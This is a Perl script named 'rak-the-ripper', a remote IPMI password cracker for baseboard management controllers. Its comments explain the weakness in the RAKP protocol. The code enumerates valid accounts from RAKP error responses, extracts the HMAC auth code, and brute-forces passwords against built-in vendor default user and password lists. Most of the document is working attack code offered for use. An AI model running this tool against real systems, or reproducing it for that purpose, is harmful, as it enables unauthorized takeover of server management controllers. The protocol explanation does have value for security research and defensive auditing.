#!/usr/bin/env perl
#
#  Usage: rak-the-ripper [options] target
#
# dan/zen@trouble.org - 6/19/2013
#
# Special thanks to Jarrod B Johnson (<jbjohnso@us.ibm.com>), whose
# implemention of RAKP for the xCAT project 
(http://xcat.sourceforge.net/)
# was instrumental to furthering my understanding of the issue.
#
#
# Remote IPMi password cracker; uses the RAKP 2 protocol to guess 
passwords
# from a remote BMC.  No account or information needed.
#
# Options:
#
#  -d Debug... let it all out
#  -i                   inform... every N guesses print out a status-y 
line
#  -n num-guesses sets N for -i option -p/path/to/words Use a file of 
#  passwords to guess, 1 per line -P password Use a specific password 
#  -u/path/to/users Use a file of users to guess, 1 per line -U 
#  specific-user Use a specific user, don't guess -v Verbose -version 
#  Print version #
#
# Explanation:
#
# IPMI v2, when using the RAKP protocol, uses HMAC hashes for 
authentication
# (see page 162 of the IPMI 2.0 spec for more details.)
#
# Three factors are of interest here:
#
#  1) You can test if an account exists (RAKP will generate a 
recognizable error
#     if not.)
#  2) IPMI will return a (supposedly) globally unique number for a BMC.  
This is
#     a potentially really interesting thing - identity of a system on a 
network
#     is a very difficult problem.  Unfortunately it looks like many 
vendors
#     don't implement this correctly... not sure if all 0's (a common 
value)
#     afects the strength of the HMAC, but...?
#  3) You get to extract the HMAC hash - and then run a password cracker 
on it.
#     Pretty interesting....!
#
# To start a RAKP session you can use the fine ipmitool utility (the 
"lanplus"
# argument here forces IPMI 2.0):
#
#     ipmitool -I lanplus -v -v -v -U ADMIN -P fluffy-wuffy -H 
192.168.0.69 chassis identify
#
# This kicks off a back-n-forth sequence with a remote BMC; for 
instance, on my iMac,
# it looks like this:
#
#               client (iMac) BMC ------------- ---- 1 get channel auth 
#         2 response 3 RMCP+ open session request 4 open session 
#         response 5 RAKP message 1 6 RAKP message 2
#
# It's in step 6 that you get the HMAC hash needed to fill in the 
details.
# Fortunately ipmitool gives you all you need.
#
# You may simply parse the verbose ipmitool output, which at one point 
will emit
# something that looks like:
#
#     >> rakp2 mac input buffer (63 bytes)
#      a4 a3 a2 a0 4c 7f fb df ec a4 a3 96 b1 d0 7e 27 cd ef 32 ae 66 cf 
#      87 b9 aa 3e 97 ed 5d 39 77 4b bc 8a c5 a9 e2 da 1d d9 35 30 30 31 
#      4d 53 00 00 00 00 00 00 00 00 00 00 14 05 41 44 4d 49 4e
#
# these bytes are, in order, the session IDs of the remote console & 
managed system,
# the remote console's random number, the managed system's random 
number,
# the managed system's GUID, the priv level, the length of the user 
name,
# and finally the user name.
#
# You simply take the HMAC of that and the password (or password guess!)
# and compare it with the key exchange auth code that the BMC has sent 
you.
#
#     <<  Key exchange auth code [sha1] : 
0xede8ec3caeb235dbad1210ef985b1b19cdb40496
#
#  Default Users:       'admin', 'USERID', 'root', 'Administrator', 
'ADMIN'
#  Default Passwords:   'PASSW0RD', 'admin', 'calvin', 'changeme', 
'opensource', 'password' use Time::HiRes; use IO::CaptureOutput 
qw/capture_exec/; use Digest::SHA qw(hmac_sha1_hex); use Getopt::Long 
qw(:config no_ignore_case); sub main::VERSION_MESSAGE {
   print "$0 0.0.1\n";
   exit;
};
sub main::HELP_MESSAGE {
   print "Usage: $0 [options] target\n".
   "\t-d\t\t\tDebug... print words as they're being guessed\n".
   "\t-i\t\t\tinform... every N guesses print out a status-y line\n".
   "\t-n num-guesses\t\tsets N for -i option\n".
   "\t-p /path/to/words\tUse a file of passwords to guess, 1 per 
line\n".
   "\t-P password\t\tUse a specific password \n".
   "\t-u /path/to/users\tUse a file of users to guess, 1 per line\n".
   "\t-U specific-user\tUse a specific user, don't guess\n".
   "\t-v\t\t\tVerbose\n".
   "\t-version\t\tPrint version #\n";
   exit;
};
GetOptions(
   'd' => \$debug,
   'h' => \$help, 'help' => \$help,
   'i' => \$inform, 'inform' => \$inform,
   'n=i' => \$Nguesses,
   'p=s' => \$password_file,
   'P=s' => \@guesses,
   'u=s' => \$user_file,
   'U=s' => \@users,
   'v' => \$verbose,
   'version' => \$version ) || die main::HELP_MESSAGE();
#
# process command line arg stuff
#
die main::HELP_MESSAGE() if (defined($help));
# the target, specified on command line
$target = $ARGV[0]; die main::HELP_MESSAGE() if ($target eq "");
# this can take awhile to finish...
print "Started at " . `date` if $verbose;
# anything > 0 and <= 20 characters would work here; ipmitool simply 
needs something $pass = "fluffy-wuffy-bunny!!";
#
# Need some passwords to guess... either from file or some defaults I 
made up
# Not going to cache these since they can blow up my poor mac's 
memory... feel
# free to change it ;)
#
if (! defined(@guesses)) {
   if ($password_file ne "") {
      open(PASSWORDS, $password_file) || die "can't open user file 
$password_file\n";
      print "opening password file $password_file\n" if $verbose;
   }
   else {
      print "using default passwords\n" if $verbose;
      @guesses = ('PASSW0RD', 'admin', 'calvin', 'changeme', 
'opensource', 'password');
   }
}
#
# need to know account name... either from file or some defaults I made 
up
#
if (! defined(@users)) {
   if ($user_file ne "") {
      open(ACCOUNTS, $user_file) || die "can't open user file 
$user_file\n";
      print "getting list of users from $user_file\n" if $verbose;
      @users = <ACCOUNTS>;
      chomp(@users);
      close(ACCOUNTS);
   }
   else {
      @users = ('admin', 'ADMIN', 'USERID', 'root', 'Administrator');
      print "using default user list\n" if $verbose;
   }
}
#
# a tiny subroutine to chow down on possible guesses
#
sub guesswork() {
   print "\t$guess...\n" if $debug;
   if ($inform) {
      print "\t$n guesses (so far)...\n" if (! ($n % $Nguesses));
   }
   $guess_suffix = "";
   $guess_suffix = "ses" if $n > 1;
   # $stuff = pack 'C*', map hex, @input; print 
   # hmac_sha1_hex($stuff,$pass) . "\n"; print "... 0x" . 
   # hmac_sha1_hex($stuff,$guess) . "\n";
   if ("0x" . hmac_sha1_hex($stuff,$guess) eq $hashy) {
      print "...cracked in $n guess$guess_suffix...\n\nPassword for 
$user is $guess\n\n";
      $cracked = 1;
      return 1;
   }
   $n++;
   return(0);
}
#
# look for a user, any user... RAKP will gripe if it's not valid
#
for $user (@users) {
   print("\tprobing $target for $user...\n") if $verbose;
   # chassis id starts up the RP machinery
   @icmd = ("ipmitool", "-I", "lanplus", "-v","-v","-v","-v", "-U", 
"$user", "-P", "$pass", "-H", "$target", "chassis", "identify");
   ($stdout, $stderr, $success, $exit) = capture_exec( @icmd );
   #
   # grabbing two things - the input to calculate the hash, and the hash 
itself.
   # but first... hunt for a valid user on the BMC.
   #
   if ($stdout =~ /RMCP\+ status\s+:\s+unauthorized name/) { next; }
   elsif ($stdout =~ /RMCP\+ status\s+:\s+insufficient resources for 
session/) {
      print "interesting... insufficient resources... try again?\n" if 
$verbose;
      next;
   }
   elsif ($stdout =~ /^\s*$/) { next; }
   # kill the leading whitespace & newlines... hash is in stdout, input 
data in stderr
   $stderr =~ s/\n//gs;
   $stdout =~ s/\n//gs;
   $name_found = 1;
   print "Found valid user: $user\n" if $verbose;
   # after this, no need to continue with other users
   @users = ();
   # <<  Key exchange auth code [sha1] : 
0x6e5d0a121e13fa8f73bfc2da15f7b012382f6be9
   ($hashy = $stdout) =~ m/^.*<< Key exchange auth code \[sha1\] : 
([^\s]+).*$/m;
   $hashy = $1;
   if ($hashy eq "") { print "couldn't find an auth code, skipping\n"; 
next; }
   ($input = $stderr) =~ m/^.*>> rakp2 mac input buffer \(\d+ bytes\) 
([^>]+)>>.*$/m;
   $input = $1;
   if ($input eq "") { print "couldn't find data to HMAC, skipping\n"; 
next; }
   # stuff it into binary form
   $stuff = pack 'C*', map hex, split(/ /, $input);
   print "... searching for HMAC match for $user ($hashy)\n" if 
$verbose;
   $n = 1;
   $cracked = 0;
   # curiosity ;)
   $start = Time::HiRes::gettimeofday();
   if (! defined(@guesses)) {
      while (($guess = <PASSWORDS>)) {
         chomp($guess);
         break if guesswork();
      }
      close(PASSWORDS);
   }
   else {
      for $guess (@guesses) {
         break if guesswork();
      }
  }
}
die "\nno valid accounts found\n" unless $name_found; print "$n 
passwords were tried\n" if $verbose; $end = Time::HiRes::gettimeofday(); 
$time = $end - $start; if ($verbose && $time > 0) {
   printf("time elapsed was ~ %.2f\n", $end - $start);
   $per_second = $n / $time;
   print "$n passwords were guessed, at the rate of $per_second per 
second\n";
}